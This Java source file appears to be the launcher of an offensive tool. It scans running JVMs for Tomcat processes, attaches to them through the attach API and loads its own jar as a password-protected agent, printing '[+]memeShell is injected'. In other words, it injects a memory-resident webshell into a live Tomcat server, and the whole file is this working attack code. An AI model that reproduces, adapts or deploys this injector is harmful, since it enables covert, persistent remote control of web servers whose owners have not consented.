package com.company;

import com.sun.tools.attach.VirtualMachine;
import com.sun.tools.attach.VirtualMachineDescriptor;

import java.io.File;
import java.io.IOException;
import java.util.List;

public class Main {
    public static void main(String[] args) throws IOException {
        if (args.length != 1) {
            System.out.println("Usage:java -jar ***.jar password");
            return;
        }

        VirtualMachine vm;
        List<VirtualMachineDescriptor> vmList;
        String password = args[0];
        String currentPath = Main.class.getProtectionDomain().getCodeSource().getLocation().getPath();
//        currentPath = currentPath.substring(0, currentPath.lastIndexOf("/") + 1);
        String agentFile = currentPath;
        agentFile = new File(agentFile).getCanonicalPath();
        String agentArgs = currentPath;
        if (!password.equals("") || password != null) {
            agentArgs = agentArgs + "^" + password;
        }

        while (true) {
            try {
                vmList = VirtualMachine.list();
                if (vmList.size() <= 0)
                    continue;
                for (VirtualMachineDescriptor vmd : vmList) {
                    if (vmd.displayName().contains("catalina") ||vmd.displayName().equals("")) {
                        vm = VirtualMachine.attach(vmd);
                        //ADD for tomcat windows service,dispayname is blank string and has key "catalina.home".
                        if (vmd.displayName().equals("")&& !vm.getSystemProperties().containsKey("catalina.home"))
                            continue;

                        System.out.println("[+]OK.i find a jvm.");
                        Thread.sleep(1000);
                        if (null != vm) {
                            vm.loadAgent(agentFile, agentArgs);
                            System.out.println("[+]memeShell is injected.");
                            vm.detach();
                            return;
                        }
                    }
                }

                Thread.sleep(3000);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
}